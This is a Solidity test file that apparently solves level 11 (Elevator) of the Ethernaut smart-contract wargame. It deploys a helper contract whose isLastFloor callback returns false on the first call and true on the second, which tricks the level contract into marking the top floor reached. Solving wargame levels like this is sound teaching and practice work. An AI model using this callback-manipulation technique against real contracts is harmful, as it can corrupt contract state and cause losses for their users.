// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/core/Ethernaut.sol";
import "../src/levels/11-ElevatorFactory.sol";

contract ElevatorHackHelperContract is Building {
    Elevator private elevatorContract;
    uint256 private count;

    constructor(address _elevatorContractAddress) {
        elevatorContract = Elevator(_elevatorContractAddress);
    }

    function attack() public {
        elevatorContract.goTo(0);
    }

    function isLastFloor(uint256) external returns (bool) {
        count += 1;
        if (count > 1) {
            return true;
        } else {
            return false;
        }
    }
}

contract ElevatorHackTest is Test {
    Ethernaut ethernaut;
    address attacker = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 wei);
    }

    function testElevatorHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        ElevatorFactory factory = new ElevatorFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(factory);

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // We are relying on `isLastFloor` in hackHelperContract to return `false` (1st time), then `true` (2nd time)
        // The second call would update the `top` value in `Elevator` contract to `true`
        ElevatorHackHelperContract hackHelperContract = new ElevatorHackHelperContract(
                levelAddress
            );
        hackHelperContract.attack();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
